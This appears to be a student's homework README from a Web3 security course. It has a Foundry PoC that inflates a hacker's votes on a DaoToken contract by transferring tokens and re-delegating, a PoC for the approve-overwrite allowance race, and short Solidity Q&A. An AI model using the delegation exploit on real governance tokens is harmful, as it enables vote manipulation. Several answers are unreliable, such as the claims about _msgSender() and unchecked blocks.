# Web3-Security-Dev-Batch-1-HW

### w2

#### 個人作業

找出 DaoToken 合約的漏洞，並說明其漏洞為何且撰寫一個 PoC
poc location: test/DaoToken.t.sol testExploit()

```solidity
//hacker以 alice 的private-key操作
vm.startPrank(alice);
daoToken.transfer(bob, 1000);

//hacker以 bob 的private-key操作
vm.startPrank(bob);
daoToken.delegate(hacker);
daoToken.transfer(carol, 1000);

//hacker以 carol 的private-key操作
vm.startPrank(carol);
daoToken.delegate(hacker);
daoToken.transfer(hacker, 1000);

vm.startPrank(hacker);
daoToken.delegate(hacker);
```

---

#### 團體作業

Q1: Why the state variable \_totalSupply is set to private?
--> public state variables 有 getter

Q2: Why the state variable \_balances is set to private?
--> public state variables 有 getter

Q3: What is difference between \_msgSender() and msg.sender?
Q4: Why use it here?
--> 當合約呼叫合約，則 msg.sender 會是呼叫方，\_msgSender()則是整個交易的發起者
--> 可區別交易由誰呼叫

Q5: Why the state variable \_allowances is set to private?
--> public state variables 有 getter

Q6: What is the potential risk of directly overwriting the old value of \_allowance? (Write a PoC to validate it)

```solidity
vm.prank(alice);
daoToken.approve(bob, 100);

vm.prank(bob);
daoToken.transferFrom(alice, bobAnotherAcct, 100);

vm.prank(alice);
daoToken.approve(bob, 50);

vm.prank(bob);
uint256 allowanceMoney = daoToken.allowance(alice, bob);
uint256 balance = daoToken.balanceOf(bobAnotherAcct);
assertEq(allowanceMoney , 50);
assertEq(balance, 100);
```

Q7: What is an unchecked block?
--> 一般算式有可能 under/overflow，為了避免發生會有相對應的檢查，從而衍生 gas fee。
但如果確定不會 under/overflow，就可以放在 unchecked block，就可以必免 gas fee。

Q8: Why use it here?
(Write a Poc to validate it )
--> 代表這個算是一定不會 under/overflow

Q9: Zero address is invalid in ERC721, but not in ERC20 and ERC1155. Why?
--> 因為 ERC721 的每個 token 都是獨一無二的，不像 ERC20/ ERC1155 token 是無法識別 id 的。

Q10: The code size of an address greater than zero bytes is a contract.Does it mean the code size of an address equal zero bytes is a EOA? (Write a PoC to validate it)

```solidity

    DaoToken daoToken;
	address public owner = address(1);

	function setUp() public {
		vm.startPrank(owner);
		daoToken = new DaoToken();
		vm.stopPrank();
  	}

    function testContractCodeSize() public{
		address contractAddr = address(daoToken);
		uint length = contractAddr.code.length;

		if(length > 0){
			console.log("contract length>0", length);
		} else {
			console.log("contract length==0", length);
		}
	}

	function testEOACodeSize() public{
		uint length = owner.code.length;
		assertEq(length , 0);
	}

```

Q11: What doest the assembly block actually do?

1. low-level 操作底層，而不是透過 solidity 語法
2. 優化效能，減少 gas fee
3. 和外部的合約或 Libraries 互動，這些可能不是 solidity 寫的內容
4. 以 opcode 可以直接和 EVM 互動
